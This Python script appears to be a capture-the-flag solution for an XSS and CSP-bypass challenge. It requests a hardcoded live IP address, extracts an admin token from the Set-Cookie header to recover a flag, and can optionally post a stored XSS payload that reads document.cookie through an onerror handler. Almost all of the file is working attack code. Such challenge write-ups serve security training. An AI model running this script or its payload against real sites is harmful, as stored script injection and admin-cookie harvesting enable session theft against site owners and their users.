#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
09-xss-csp-bypass exploit/helper

Usage:
  python3 main.py
  python3 main.py --submit-xss

作用：
1. 访问目标首页，从 Set-Cookie 中解析 ADMIN_TOKEN。
2. URL 解码后提取 TOGOGO-flag{...}。
3. 可选提交一个最小无引号事件处理器 XSS payload，方便浏览器手工复现。
"""

import argparse
import re
from http.cookies import SimpleCookie
from urllib.parse import unquote

import requests

TARGET = "http://47.120.61.230:33270/"
XSS_PAYLOAD = "<img src=x onerror=alert(document.cookie)>"


def parse_flag_from_set_cookie(headers: requests.structures.CaseInsensitiveDict) -> str | None:
    """Extract and URL-decode flag from Set-Cookie ADMIN_TOKEN."""
    raw_cookie = headers.get("Set-Cookie", "")
    if not raw_cookie:
        return None

    cookie = SimpleCookie()
    cookie.load(raw_cookie)

    token = None
    if "ADMIN_TOKEN" in cookie:
        token = cookie["ADMIN_TOKEN"].value
    else:
        # fallback: requests/headers may merge cookies in uncommon formats
        m = re.search(r"ADMIN_TOKEN=([^;]+)", raw_cookie)
        if m:
            token = m.group(1)

    if not token:
        return None

    token = unquote(token)
    m = re.search(r"TOGOGO-flag\{[^}]+\}", token)
    return m.group(0) if m else token


def get_flag(target: str) -> str:
    resp = requests.get(target, timeout=10)
    print(f"[+] GET {target} -> HTTP {resp.status_code}")
    print(f"[+] CSP: {resp.headers.get('Content-Security-Policy', '<none>')}")
    print(f"[+] Set-Cookie: {resp.headers.get('Set-Cookie', '<none>')}")

    flag = parse_flag_from_set_cookie(resp.headers)
    if not flag:
        raise RuntimeError("未能从 Set-Cookie 中解析到 ADMIN_TOKEN/flag")
    return flag


def submit_xss(target: str) -> None:
    data = {
        "author": "py_xss",
        "content": XSS_PAYLOAD,
    }
    resp = requests.post(target, data=data, timeout=10, allow_redirects=False)
    print(f"[+] POST XSS payload -> HTTP {resp.status_code}")
    print(f"[+] Payload: {XSS_PAYLOAD}")
    print(f"[+] Then open in browser: {target}")


def main() -> None:
    parser = argparse.ArgumentParser(description="09-xss-csp-bypass flag getter")
    parser.add_argument("-u", "--url", default=TARGET, help="target url")
    parser.add_argument("--submit-xss", action="store_true", help="submit stored XSS PoC payload")
    args = parser.parse_args()

    flag = get_flag(args.url)
    print(f"\n[FLAG] {flag}")

    if args.submit_xss:
        print("\n[*] Submitting stored XSS PoC...")
        submit_xss(args.url)


if __name__ == "__main__":
    main()
